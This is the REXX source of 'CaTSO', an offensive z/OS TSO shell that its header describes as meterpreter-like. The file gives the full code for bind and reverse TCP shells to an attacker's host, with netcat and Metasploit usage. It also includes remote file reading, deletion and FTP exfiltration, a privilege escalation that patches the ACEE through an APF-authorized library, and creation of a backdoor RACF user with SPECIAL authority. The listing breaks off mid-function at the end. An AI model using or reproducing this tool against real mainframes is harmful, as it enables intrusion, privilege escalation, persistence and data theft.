/*                           REXX                                    */
/*  Catso. n. 1. A base fellow; a rogue; a cheat,                    */
/*               also a z/OS Network TSO 'shell'                     */
/*                                                                   */
/*  CaTSO is a A "meterpreter" like shell written in REXX.           */
/*  Yet another amazing mainframe tool brought to you by:            */
/*             .                  .         .                        */
/*             .___________       ._________.                        */
/*             :    .     /       :         :                        */
/*             |    |____/________|    _____|                        */
/*             |____.    |        |         |                        */
/*             |    |    |    :   |   ______:                        */
/*             |    |    |    |   |   |     .                        */
/*             :_________|________|___|                              */
/*             . Soldier     of     Fortran                          */
/*                   (@mainframed767)                                */
/*                                                                   */
/*  This is a REXX script meant to run in TSO on IBM z/OS            */
/*  It creates a Listener or Reverse 'shell' on a supplied port      */
/*  Connect to it with either metasploit or netcat                   */
/*                                                                   */
/*  Either upload the script and execute: tso ex 'userid.zossock'    */
/*  or use a JCL file and execute it that way                        */
/*  On the PC side you can use Netcat or Metasploit to connect.      */
/*                                                                   */
/*  In Listener Mode                                                 */
/*  ================                                                 */
/*  On the Mainframe:                                                */
/*  <scriptname> L Port                                              */
/*                                                                   */
/*  With Metasploit:                                                 */
/*  msf > use multi/handler                                          */
/*  msf exploit(handler) > set payload generic/shell_bind_tcp        */
/*  payload => generic/shell_bind_tcp                                */
/*  msf exploit(handler) > set RHOST IP  (Mainframe IP Address)      */
/*  msf exploit(handler) > set LPORT Port (the port you picked)      */
/*  msf exploit(handler) > exploit                                   */
/*                                                                   */
/*  With Netcat:                                                     */
/*  $ nc IP Port                                                     */
/*                                                                   */
/*  In Reverse Mode                                                  */
/*  ================                                                 */
/*  With Metasploit:                                                 */
/*  msf > use multi/handler                                          */
/*  msf exploit(handler) > set payload generic/shell_reverse_tcp     */
/*  payload => generic/shell_reverse_tcp                             */
/*  msf exploit(handler) > set lhost your-ip-address                 */
/*  msf exploit(handler) > set LPORT your-port                       */
/*  msf exploit(handler) > exploit                                   */
/*                                                                   */
/*  With Netcat:                                                     */
/*  $ nc -lp your_port                                               */
/*                                                                   */
/*  On the Mainframe:                                                */
/*  <scriptname> R your-ip-addredd your-port                         */
/*                                                                   */
/*  ASCII Art modified from:                                         */
/*   http://sixteencolors.net/pack/rmrs-03/DW-CHOOS.ANS              */
/*                                                                   */
/*                   Let's start the show!                           */
/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
 
/* Uncomment this line to turn on debugging */
/* TRACE I */
/* change verbose to 1 to see results on the screen */
verbose = 1
 
if verbose then say ''
if verbose then say ''
if verbose then say ''
pwd = userid()
NEWLINE = "25"x /* this is the hex equivalent of EBCDIC /n */
 
PARSE ARG type arghost argport
 
/* Parse the arguments to see what we want to do */
SELECT
WHEN type = 'L' THEN
DO
   IF arghost = '' THEN
   DO
     if verbose then say "[+] You specified Listener without a port."
     if verbose then say "Using default: 12345"
     arghost = 12345
   END
if verbose then say '[+] Listening on port:' arghost
party = MATT_DAEMON(arghost)
END
WHEN type = 'R' THEN
DO
  IF arghost = '' | argport = '' THEN
  DO
   SAY '[!] You must pass a host and port when using Reverse'
   EXIT 4
  END
  if verbose then say '[+] Sending shell to' arghost||":"||argport
 ttime = RIVER_SONG(arghost,argport) /* Reverse Connection */
END
OTHERWISE  /* Excellent */
        PARSE SOURCE . . . . name .
        say "No arguments passed! Run this as either server or client:"
        say "Reverse Shell: '"||name||"' 'R IP PORT'"
        say "Listener Shell: '"||name||"' 'L PORT'"
    EXIT 4
END /* End the arguments parser */
 
MATT_DAEMON: /* Starts the listener mode */
    parse arg port
    terp = SOCKET('INITIALIZE','DAEMON',2)
    /* terp is short for z-terpreter */
    parse var terp terp_rc .
    IF terp_rc <> 0 THEN
    DO
      if verbose then say "[!] Couldn't create socket"
      exit 1
    END
    terp = Socket('GetHostId')
    parse var terp socket_rc MF_IP .
    terp = Socket('Gethostname')
    parse var terp src hostname
    /* setup the socket */
    terp = SOCKET('SOCKET')
    parse var terp socket_rc socketID .
    if socket_rc <> 0 then
    DO
      if verbose then say "[!] Socket FAILED with info:" terp
      terp = SOCKET('TERMINATE')
      exit 1
    END
 
    /* Setup: ASCII conversion, Reuse, no linger and non-blocking */
  terp = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_REUSEADDR','ON')
    terp = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_LINGER','OFF')
  terp = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_KEEPALIVE','ON')
    terp = Socket('IOCTL',socketID,'FIONBIO','ON')
    terp = Socket('BIND',socketID,'AF_INET' port MF_IP)
    parse var terp connect_rc rest
    if connect_rc <> 0 then
    DO
      if verbose then say "[!] Bind Failed:" terp
      CALL DAVID_COULIER(1)
    END
    if verbose then say "[!] IP" MF_IP "and Port" port "opened"
    terp = Socket('Listen',socketID,2)
    parse var terp src .
    if src > 0 then DAVID_COULIER(1)
    if verbose then say '[+] Server Ready'
 
    clients = ''
   DO FOREVER /* Like, forever forever? A: Yes. */
    terp = Socket('Select','READ' socketID clients 'WRITE' 'EXCEPTION')
parse upper var terp 'READ' readin 'WRITE' writtin 'EXCEPTION' exceptin
 
    IF INLIST(socketID,readin) THEN /* see if we have a new socket */
    DO
     terp = Socket('Accept',socketID)
     parse var terp src hackerID . hport hip
     if verbose then say "[!] Connection from "||hip||":"||hport
     clients = hackerID
     if verbose then say '[+] Hacker socket ID' clients
     terp = Socket('Socketsetstatus')
     parse var terp src . status
     if verbose then say '[+] Current Status' status
     terp = Socket('Setsockopt',hackerID,'SOL_SOCKET','SO_ASCII','ON')
     terp = Socket('Ioctl',hackerID,'FIONBIO','ON' )
     terp = SOCKET('SEND',hackerID, "Enter command or 'help'> ")
    END /* end new connection check */
/* If the READ is our hacker socket ID then do all the goodness */
/* since there's only one socket allowed, it will only be that id */
    if readin = hackerID THEN
    DO
     ARNOLD = commando(hackerID) /* get the command */
     if verbose then say "[+] Commands received: "||ARNOLD
     parse = CHOPPA(hackerID,ARNOLD) /* Get the cmd to da choppa! */
    END
   END /* OK not forever */
 
return 0
 
RIVER_SONG: /* Get it? Reverse Con, connection? Yea you got it! */
PARSE ARG rhost,  rport
    terp = SOCKET('INITIALIZE','CLIENT',2)
    /* terp is short for z-terpreter */
    terp = SOCKET('SOCKET',2,'STREAM','TCP')
    parse var terp socket_rc socketID .
    if socket_rc <> 0 then
    do
       if verbose then say "[!] Socket FAILED with info:" terp
       terp = SOCKET('TERMINATE')
       exit 1
    end
  terp = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_KEEPALIVE','ON')
    /* Okay now we setup so it can do EBCDIC to ASCII conversion */
    terp = SOCKET('SETSOCKOPT',socketID,'SOL_SOCKET','SO_ASCII','On')
    parse var terp ascii_rc .
    if ascii_rc <> 0 then
    do
      if verbose then say "[!] Setting ASCII mode failed:" terp
      exit 1
    end
    terp = SOCKET('SOCKETSETSTATUS','CLIENT')
    if verbose then say "[+] Socket Status is" terp
    terp = SOCKET('CONNECT',socketID,'AF_INET' rport rhost)
    parse var terp connect_rc rest
    if connect_rc <> 0 then
    do
      if verbose then say "[!] Connection Failed:" terp
      CALL DAVID_COULIER(4)
    end
    if verbose then say "[!] Connection Established to",
                        rhost||":"||rport
    terp = SOCKET('SEND',socketID, "Enter command or 'help'> ")
 
    DO FOREVER /* The never end storyyyyy */
      ARNOLD = commando(socketID) /* get the command */
      if verbose then say "[+] Commands received: "||ARNOLD
      parse = CHOPPA(socketID,ARNOLD) /* get the cmd to da choppa! */
    END /* Atreyu! */
return 0
 
DAVID_COULIER: /* CUT. IT. OUT. */
    parse arg exito .
    terp = SOCKET('CLOSE',socketID)
    EXIT exito
return 0
 
CHOPPA:
parse arg sockID, do_it
parse var do_it do_it do_commands
/* We have our socket and commands not lets do this */
    SELECT
        WHEN do_it = 'sysinfo' THEN
        DO
          send_it = GET_OS_INFO()
          if verbose then say '[!] Sending OS Info'
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'apf' THEN
        DO
          send_it = list_apf()
          if verbose then say '[!] Sending APF Info'
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'cat' THEN
        DO
          send_it = CAT_FILE(do_commands)
          if verbose then say '[!] Catting file' do_commands
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'cd' THEN
        DO
            if verbose then say '[!] CD to' do_commands
            send_it = NEWLINE||"cd to "||do_commands||NEWLINE
            pwd = do_commands
            terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'pwd' THEN
        DO
          send_it = NEWLINE||UPPER(pwd)||NEWLINE
          if verbose then say '[!] Sending PWD of:' pwd
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'ls' THEN
        DO
          IF do_commands = '' THEN
            send_it = LS(sockID,pwd)
          ELSE
            send_it = LS(sockID,do_commands)
          if verbose then say '[!] Sending LS COMMAND'
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'cp' THEN
        DO
          send_it = CP(do_commands)
          if verbose then say '[!] Copying' do_commands
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'del' | do_it = 'delete' THEN
        DO
          send_it = DELETE(do_commands)
          if verbose then say '[!] Deleting' do_commands
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
 
        WHEN do_it = 'unix' THEN
        DO
          send_it = UNIX_COMMAND(do_commands)
          if verbose then say '[!] Sending UNIX COMMAND'
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'tso' | do_it = 'execute' THEN
        DO
          send_it = TSO_COMMAND(do_commands)
          if verbose then say '[!] Executing TSO Command' do_commands
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'ftp' THEN
        DO
          send_it = UPLOAD_FILE(do_commands)
          if verbose then say '[!] Using FTP to upload to' do_commands
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'getuid' THEN
        DO
          send_it = GET_UID()
          if verbose then say '[!] Sending UID'
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'lsmem' THEN
        DO
          IF do_commands = '' THEN
            send_it = LS_MEMBERS(pwd)
          ELSE
            send_it = LS_MEMBERS(do_commands)
          if verbose then say '[!] Sending Members'
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'ipconfig' | do_it = 'ifconfig' THEN
        DO
          send_it = GET_IP_INFO()
          if verbose then say '[!] Sending IP Info'
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'racf' THEN
        DO
          send_it = GET_RACFDB()
          if verbose then say '[!] Sending RACF Database Dataset Name'
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'privesc' THEN
        DO
          send_it = PRIVESC(do_commands)
          if verbose then say '[!] Sending RACF Database Dataset Name'
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'adduser' THEN
        DO
          send_it = ADDUSER(do_commands)
          if verbose then say '[!] Sending RACF Database Dataset Name'
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'help' THEN
        DO
          send_it = GET_HELP()
          if verbose then say '[!] Sending Help'
          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
        END
        WHEN do_it = 'quit' | do_it = 'exit' THEN
        DO
          if verbose then say '[!] POP POP!'
          CALL DAVID_COULIER(0) /* jackalope */
     END
     OTHERWISE /* The end of our options */
         if verbose then say '[!] Unrecognized Command'
    END /* End the select section */
    terp = SOCKET('SEND',sockID, "Enter command or 'help'> ")
  return 0
 
INLIST: procedure
arg sock, socklist
 
DO i = 1 to words(socklist)
  if words(socklist) = 0
    then return 0
  if sock = word(socklist,i)
    then return 1
end
 
return 0
 
commando:  /* GET IN DA CHOPPA */
parse arg socket_to_use
/* get commands */
     choppa = ''
     sox = SOCKET('RECV',socket_to_use,10000)
     parse var sox s_rc s_type s_port s_ip s_results
     parse var sox s_rc s_data_len s_data_text
     if s_rc <> 0 then
     do
        if verbose then say "[!] Couldn't get data"
        CALL DAVID_COULIER(1)
     end
     /* Strip off the last byte cause it's all weird */
     chopper = DELSTR(s_data_text, LENGTH(s_data_text))
  return chopper
 

GET_UID: /* returns the UID */
   text = NEWLINE||"Mainframe userID: "||userid()||NEWLINE
   return text
 
GET_IP_INFO:
/* Uses TSO command 'netstat home' to get IP config */
/* Requires TSO segment */
   x = OUTTRAP('var.')
   address tso  "NETSTAT HOME"
   parse var var.1 a1 a2 a3 a4 a5 a6 a7 a8 type .
   text = NEWLINE||"TCP/IP Name:" type||NEWLINE
   IPADDR = SOCKET('GETHOSTID')
   parse var IPADDR ip_rc ip_addr
  text = text||"Connected using IP Address: "||ip_addr||NEWLINE||NEWLINE
   j = 1
   DO i = 5 TO var.0
       parse var var.i garbage ip_addr link flag_sp
       flag = SPACE(flag_sp,0)
       text = text||"Interface "||j||NEWLINE||"=========="||NEWLINE,
       "Name         : "||link||NEWLINE,
       "IPv4 Address : "||ip_addr||NEWLINE,
       "Flag         : "||flag||NEWLINE||NEWLINE
       j = j + 1
   end
   x = OUTTRAP(OFF)
 return text
 
GET_RACFDB:
/* Gets the dataset (aka file) name of the RACF database */
/* This requires a TSO segment */
   x = OUTTRAP('var.')
   address tso "RVARY LIST"
   parse var var.4 active1 use1 num1 volume1 dataset1_sp
   parse var var.5 active2 use2 num2 volume2 dataset2_sp
   dataset1 = SPACE(dataset1_sp,0)
   dataset2 = SPACE(dataset2_sp,0)
   if use1 = 'PRIM' then
     text = NEWLINE||"Primary"||NEWLINE||"========"||NEWLINE
   else
     text = NEWLINE||"Backup"||NEWLINE||"========"||NEWLINE
 
     text = text||" Active    : "||active1||NEWLINE,
            "FileName  : "||dataset1||NEWLINE||NEWLINE
   if use2 = 'PRIM' then
     text = text||"Primary"||NEWLINE||"========"||NEWLINE
   else
     text = text||"Backup"||NEWLINE||"========"||NEWLINE
 
     text = text||" Active    : "||active2||NEWLINE,
                  "Filename  : "||dataset2||NEWLINE
   x = OUTTRAP(OFF)
   return text
 
UNIX_COMMAND:
/* Executes a UNIX command (aka OMVS) */
    parse arg unix_command
    CALL BPXWUNIX unix_command,,out.
    text = ''||NEWLINE /* blank out text */
    DO i = 1 TO out.0
       text = text||out.i||NEWLINE
    END
  return text
 
TSO_COMMAND:
/* outputs the results of a TSO command */
   parse arg tso_do
   text = NEWLINE||"Issuing TSO Command: "||tso_do||NEWLINE
   u = OUTTRAP('tso_out.')
   ADDRESS TSO tso_do
   u = OUTTRAP(OFF)
   DO i = 1 to tso_out.0
      text = text||tso_out.i||NEWLINE
   END
 return text
 
GET_OS_INFO:
/* z/OS Operating System Information */
/* Lots of help from the LPINFO script from */
/* www.longpelaexpertise.com.au */
   cvtaddr = get_dec_addr(16)
   zos_name = Strip(Storage(D2x(cvtaddr+340),8))
   ecvtaddr = get_dec_addr(cvtaddr+140)
   zos_ver = Strip(Storage(D2x(ecvtaddr+512),2))
   zos_rel = Strip(Storage(D2x(ecvtaddr+514),2))
   sysplex = Strip(Storage(D2x(ecvtaddr+8),8))
   jes_p = SYSVAR('SYSJES')
   parse var jes_p jes .
   jes_node = jes||' (Node: '|| SYSVAR('SYSNODE')||')'
   security_node = get_security_system(cvtaddr+992)
   text = NEWLINE,
       "Computer    : LPAR "|| zos_name||NEWLINE,
       "Sysplex     : "||sysplex||NEWLINE,
       "OS          : z/OS" zos_ver||.||zos_rel||NEWLINE,
       "Job Entry   : "||jes_node||NEWLINE,
       "Security    : "||security_node||NEWLINE,
       "Meterpreter : z/OS REXX"||NEWLINE
   return text
 
get_dec_addr: /* Needed for GET_OS_INFO */
     parse arg addr
     hex_addr = d2x(addr)
     stor = Storage(hex_addr,4)
     hex_stor = c2x(stor)
     value = x2d(hex_stor)
  return value
get_security_system:  /* needed for GET_OS_INFO */
     parse arg sec_addr
     cvtrac = get_dec_addr(sec_addr)
     rcvtid = Storage(d2x(cvtrac),4)
     if rcvtid = 'RCVT' then return 'RACF'
     if rcvtid = 'RTSS' then return 'CA Top Secret'
     if rcvtid = 'ACF2' then return 'CA ACF2'
   return 0
 
CAT_FILE:
/* Cats a file and returns it to the screen */
  parse arg meow .
  cat = STRIP(meow)
  ADDRESS TSO "ALLOC F(intemp) DSN('"||cat||"') SHR"
  ADDRESS TSO "EXECIO * DISKR intemp (FINIS STEM TIGER."
  ADDRESS TSO "free file(intemp)"
  text = NEWLINE||'File: '||meow||NEWLINE
  text = text||'File Length: '||TIGER.0||NEWLINE
  DO i = 1 TO TIGER.0
      text = text||TIGER.i||NEWLINE
 
  END
 return text
 
CP: /* Uses a JCL to copy one file to the other */
    parse arg from_DS to_DS
    IF to_DS = '' THEN
    DO
      text = NEWLINE||"cp command requires a to and a from.",
             "You only supplied: "||from_DS||NEWLINE
      return text
    END
    DROPBUF 0
    queue "//CPTHATS EXEC PGM=IEBGENER"
    queue "//SYSPRINT DD SYSOUT=*"
    queue "//SYSIN    DD DUMMY"
    queue "//SYSUT1   DD DSN="||from_DS||",DISP=SHR"
    queue "//SYSUT2   DD DSN="||to_DS||","
    queue "//     LIKE="||from_DS||","
    queue "//     DISP=(NEW,CATLG,DELETE),"
    queue "//     UNIT=SYSDA"
    queue "/*"
    queue "@#"
    v = OUTTRAP('sub.')
    ADDRESS TSO "SUB * END(@#)"
    v = OUTTRAP(OFF)
  text = NEWLINE||"File "||from_DS||" copying to "||to_DS||NEWLINE
  return text
 
DELETE:
    /* Deletes a file or dataset member */
    parse arg deleteme .
    IF deleteme = '' THEN
    DO
      text = NEWLINE||"You didn't supply a dataset to delete"
      return text
    END
    d = OUTTRAP('tdel.')
    ADDRESS TSO "DELETE '"||deleteme||"'"
    /* if you don't put '' around a dataset it prepends your userid */
    d = OUTTRAP(OFF)
    text = NEWLINE
    DO i = 1 to tdel.0
      text = text||NEWLINE||tdel.i
    END
  return text
 
UPLOAD_FILE:
/* Uploads a file from the mainframe to an FTP server */
/* It submits a JOB which uploads the file */
/* FYI this doesn't always work with a debian FTP server */
    parse arg ftp_server username password dataset binary .
    DROPBUF 0 /* clear the buffer */
    queue "//FTP      EXEC PGM=FTP,"
    queue "//         PARM='"||ftp_server||" (EXIT' "
    queue "//SYSMDUMP DD   SYSOUT=* "
    queue "//SYSPRINT DD   SYSOUT=* "
    queue "//INPUT DD * "
    queue username
    queue password
    if binary = "binary" then queue put "binary"
    queue "put '"||dataset||"'"
    queue "quit "
    queue "/*"
    queue "@#"
    ADDRESS TSO "SUB * END(@#)"
    text = NEWLINE||"Uploading file "||dataset||" to "||ftp_server,
           "using user name"||username||"."
    if binary = "binary" then
        text = text||" Using Binary transfer mode."
    else
        text = text||" Not using Binary transfer mode."
  return text
 
LS:
/* Lists datasets given a high level qualifier (hlq) */
    parse arg suckit, hilevel .
    filez = STRIP(hilevel)
    IF filez = '' then filez = USERID()
    hedr = NEWLINE||" Listing Files: " filez||".*"||NEWLINE,
           "========================================="||NEWLINE
    terp = SOCKET('SEND',suckit, hedr)
    text = NEWLINE
    b = OUTTRAP('ls_cmd.')
    ADDRESS TSO "LISTC LEVEL("||filez||")"
    b = OUTTRAP(OFF)
    filed = 1
    DO i = 1 to ls_cmd.0
       IF filed THEN
        DO
          text = text||ls_cmd.i||NEWLINE
          filed = 0
        END
       ELSE
          filed = 1
    END
 
  return text
 
LS_MEMBERS:
/* Lists datasets given a 'high level qualifier, or HLQ */
    parse arg hilevelmem .
    text = NEWLINE
    x = OUTTRAP('members.')
    ADDRESS TSO "LISTDS '"||hilevelmem||"' members"
    x = OUTTRAP(OFF)
    DO i = 7 TO members.0
       members.i = STRIP(members.i)
       text = text||'--> '||hilevelmem||"("||members.i||")"||NEWLINE
    END
  return text
 
UPPER:
/* Of all the built-in functions, this isn't one of them */
    PARSE UPPER ARG STRINGED
    return STRINGED

LOWER: procedure
  parse arg string
  return TRANSLATE(string, xrange('a','z'), xrange('A','Z'))

PRIVESC:
   parse arg dsn_apf
   if dsn_apf ='' then
     return("! apf authorized dataset name required" newline)

    t = apf_privesc(dsn_apf)
    return(t)
   

ADDUSER:
   parse arg dsn_apf
   if dsn_apf ='' then
     return("! apf authorized dataset name required" newline)

    t = apd_add_user(dsn_apf)
    return(t)


apf_privesc:
    parse arg dsn_input
    call listdsi "'"dsn_input"'"

    if sysdsorg <> "PO" then do
        return("! Cannot find APF Library '"dsn_input"', or not PDS")
        
    end

    priv  =  check_priv(dsn_input)

    if (priv == "NONE") then do
        return("! Not enough privileges to alter APF library "dsn_input)
    end

    if (priv == "READ") then do
        return("! Not enough privileges to alter APF library "dsn_input)
    end
    if priv=="NO RACF PROFILE" then do
        text =  "! Warning: No RACF profile defined for"||,
   ""dsn_input", might not be uptable" 
    end

    t = launch_payload(dsn_input)

  return(text||newline||t)

launch_payload:
    APF_DSN = arg(1)
    PROG = rand_char(6)
    reply =  "+ Compiling " PROG "in" dsn_input newline
    QUEUE "//ELVAPF  JOB (JOBNAME),'XSS',CLASS=A,NOTIFY=&SYSUID"
    QUEUE "//*"
    QUEUE "//BUILD   EXEC ASMACL"
    QUEUE "//C.SYSLIB  DD DSN=SYS1.SISTMAC1,DISP=SHR"
    QUEUE "//          DD DSN=SYS1.MACLIB,DISP=SHR"
    QUEUE "//C.SYSIN   DD *"
    QUEUE "       CSECT"
    QUEUE "       AMODE 31"
    QUEUE "       STM 14,12,12(13)"
    QUEUE "       BALR 12,0"
    QUEUE "       USING *,12"
    QUEUE "       ST 13,SAVE+4"
    QUEUE "       LA 13,SAVE"
    QUEUE "*"
    QUEUE "       MODESET KEY=ZERO,MODE=SUP"
    QUEUE "       L 5,X'224'           POINTER TO ASCB"
    QUEUE "       L 5,X'6C'(5)         POINTER TO ASXB"
    QUEUE "       L 5,X'C8'(5)         POINTER TO ACEE"
    QUEUE "       NI X'26'(5),X'00'"
    QUEUE "       OI X'26'(5),X'B1'    SPE + OPER + AUDITOR ATTR"
    QUEUE "       NI X'27'(5),X'00'"
    QUEUE "       OI X'27'(5),X'80'    ALTER ACCESS"
    QUEUE "*"
    QUEUE "       L 13,SAVE+4"
    QUEUE "       LM 14,12,12(13)"
    QUEUE "       XR 15,15"
    QUEUE "       BR 14"
    QUEUE "*"
    QUEUE "SAVE   DS 18F"
    QUEUE "    END"
    QUEUE "/*"
    QUEUE "//L.SYSLMOD DD DISP=SHR,DSN="||APF_DSN||""
    QUEUE "//L.SYSIN   DD *"
    QUEUE "  SETCODE AC(1)"
    QUEUE "  NAME "||PROG||"(R)"
    QUEUE "/*"
    QUEUE "//STEP01 EXEC PGM="||PROG||",COND=(0,NE)"
    QUEUE "//STEPLIB   DD DSN="||APF_DSN||",DISP=SHR"
    QUEUE "//STEP02 EXEC PGM=IKJEFT01,COND=(0,NE)"
    QUEUE "//SYSTSIN DD *"
    QUEUE " ALU "||userid()||" SPECIAL OPERATIONS"
    QUEUE "/*"
    QUEUE "//SYSIN   DD DUMMY"
    QUEUE "//SYSTSPRT DD SYSOUT=*"
    QUEUE "//*"
    QUEUE "$$"

    o = OUTTRAP("output.",,"CONCAT")
    address tso "SUBMIT * END($$)"
    o = OUTTRAP(OFF)

    return(reply)


apd_add_user:
    APF_DSN = arg(1)
    PROG = rand_char(6)
    USER = rand_char(8)
    PASS = rand_char(8)
    USERUC = UPPER(USER)
    USERLC = LOWER(USER)
    reply =  "+ Compiling " PROG "in" APF_DSN newline
    QUEUE "//ELVAPF  JOB (JOBNAME),'XSS',CLASS=A,NOTIFY=&SYSUID"
    QUEUE "//*"
    QUEUE "//BUILD   EXEC ASMACL"
    QUEUE "//C.SYSLIB  DD DSN=SYS1.SISTMAC1,DISP=SHR"
    QUEUE "//          DD DSN=SYS1.MACLIB,DISP=SHR"
    QUEUE "//C.SYSIN   DD *"
    QUEUE "       CSECT"
    QUEUE "       AMODE 31"
    QUEUE "       STM 14,12,12(13)"
    QUEUE "       BALR 12,0"
    QUEUE "       USING *,12"
    QUEUE "       ST 13,SAVE+4"
    QUEUE "       LA 13,SAVE"
    QUEUE "*"
    QUEUE "       MODESET KEY=ZERO,MODE=SUP"
    QUEUE "       L 5,X'224'           POINTER TO ASCB"
    QUEUE "       L 5,X'6C'(5)         POINTER TO ASXB"
    QUEUE "       L 5,X'C8'(5)         POINTER TO ACEE"
    QUEUE "       NI X'26'(5),X'00'"
    QUEUE "       OI X'26'(5),X'B1'    SPE + OPER + AUDITOR ATTR"
    QUEUE "       NI X'27'(5),X'00'"
    QUEUE "       OI X'27'(5),X'80'    ALTER ACCESS"
    QUEUE "*"
    QUEUE "       L 13,SAVE+4"
    QUEUE "       LM 14,12,12(13)"
    QUEUE "       XR 15,15"
    QUEUE "       BR 14"
    QUEUE "*"
    QUEUE "SAVE   DS 18F"
    QUEUE "    END"
    QUEUE "/*"
    QUEUE "//L.SYSLMOD DD DISP=SHR,DSN="||APF_DSN||""
    QUEUE "//L.SYSIN   DD *"
    QUEUE "  SETCODE AC(1)"
    QUEUE "  NAME "||PROG||"(R)"
    QUEUE "/*"
    QUEUE "//STEP01 EXEC PGM="||PROG||",COND=(0,NE)"
    QUEUE "//STEPLIB   DD DSN="||APF_DSN||",DISP=SHR"
    QUEUE "//************************************************ "
    QUEUE "//* "
    QUEUE "//* Create a user with a random password, TSO and OMVS segments "
    QUEUE "//* "
    QUEUE "//************************************************"
    QUEUE "//*-----------------------------------------------"
    QUEUE "//*-----------------------------------------------"
    QUEUE "//* Define symbols for the job steps "
    QUEUE "//E1       EXPORT SYMLIST=(USERUC,USERLC,NAME,MAINGRP,INSTID)"
    QUEUE "//S1          SET USERUC="||USERUC||""
    QUEUE "//S2          SET USERLC='"||USERLC||"'"
    QUEUE "//S4          SET MAINGRP=MYGROUP"
    QUEUE "//S4          SET INSTID=CUS"
    QUEUE "//S3          SET NAME='Hacked'"
    QUEUE "//ADDUSER  EXEC PGM=IKJEFT01 "
    QUEUE "//SYSTSPRT   DD SYSOUT=* "
    QUEUE "//SYSTSIN    DD *,SYMBOLS=JCLONLY "
    QUEUE "  ADDUSER &USERUC - "
    QUEUE "    DFLTGRP(&MAINGRP) - "
    QUEUE "    OWNER(IBMUSER) - "
    QUEUE "    NAME('&NAME') - "
    QUEUE "    PASSWORD("||PASS||") - "
    QUEUE "    TSO( - "
    QUEUE "        ACCTNUM(ACCT#) - "
    QUEUE "        PROC(ISPFPROC) - "
    QUEUE "        COMMAND(ISPF) - "
    QUEUE "       ) - "
    QUEUE "    OMVS( - "
    QUEUE "         AUTOUID - "
    QUEUE "         HOME('/home/&USERLC') - "
    QUEUE "         PROGRAM('/bin/sh') - "
    QUEUE "        ) "
    QUEUE ""
    QUEUE "  ADDSD '&USERUC..*.**' UACC(NONE) "
    QUEUE "  PERMIT '&USERUC..*.**' ACCESS(ALTER) ID(&USERUC) "
    QUEUE "  ADDSD '&USERUC..**.ZFS' UACC(READ) "
    QUEUE ""
    QUEUE "  PERMIT ACCT# CLASS(ACCTNUM) ID (&USERUC) "
    QUEUE ""
    QUEUE "  PERMIT JCL CLASS(TSOAUTH) ID(&USERUC) ACCESS(READ) "
    QUEUE ""
    QUEUE "  SETROPTS GENERIC(DATASET) REFRESH "
    QUEUE "  SETROPTS RACLIST(TSOAUTH) REFRESH "
    QUEUE "  ALU &USERUC SPECIAL OPER "
    QUEUE "//*------------------------------------------------------"
    QUEUE "//* Create an alias in the usercatalog, so the user can create DS "
    QUEUE "//CATALIAS EXEC PGM=IDCAMS "
    QUEUE "//SYSPRINT   DD SYSOUT=* "
    QUEUE "//SYSIN      DD *,SYMBOLS=JCLONLY "
    QUEUE "  DEFINE ALIAS(NAME(&USERUC) RELATE(USERCAT.&INSTID)) "
    QUEUE "//*-----------------------------------------------------"
    QUEUE "//* Create ZFS for home directory "
    QUEUE "//* Save the ZFS in a linerar VSAM cluster "
    QUEUE "//* 50MB of initial allocation plus increments of 10MB "
    QUEUE "//* The VSAM cluster is shareable "
    QUEUE "//CREATEFS EXEC PGM=IDCAMS "
    QUEUE "//SYSPRINT   DD SYSOUT=* "
    QUEUE "//SYSIN      DD *,SYMBOLS=JCLONLY "
    QUEUE "  DEFINE CLUSTER( - "
    QUEUE "                 NAME(&USERUC..OMVSHOME.ZFS) - "
    QUEUE "                 LINEAR - "
    QUEUE "                 CYLINDERS(50 10) - "
    QUEUE "                 SHAREOPTIONS(2) - "
    QUEUE "                ) "
    QUEUE "//*------------------------------------------------------------"
    QUEUE "//* Format the ZFS "
    QUEUE "//* Uses the Aggregate Format in the IOE segment "
    QUEUE "//* Runs  IOEAGFMT in compatibility mode "
    QUEUE "//FORMATFS EXEC PGM=IOEAGFMT,REGION=0M, "
    QUEUE "//             PARM=('-aggregate &USERUC..OMVSHOME.ZFS -compat') "
    QUEUE "//SYSPRINT   DD SYSOUT=* "
    QUEUE "//STDOUT     DD SYSOUT=* "
    QUEUE "//STDERR     DD SYSOUT=* "
    QUEUE "//*"
    QUEUE "$$"

    o = OUTTRAP("output.",,"CONCAT")
    address tso "SUBMIT * END($$)"
    o = OUTTRAP(OFF)

    reply = reply || "Added user" USERUC "with password" PASS

    return(reply)

rand_char:
    length = arg(1)
    out = ""
    do counter=1 to length
       i = RANDOM(1,3)
       if i ==1 then out = out||D2C(RANDOM(193,201))
       if i ==2 then out = out||D2C(RANDOM(226,233))
       if i ==3 then out = out||D2C(RANDOM(209,217))
    end
    return out

list_apf:
    text = ''
    NUMERIC  DIGITS 10
    CVT      = C2d(Storage(10,4))                /* point to cvt */
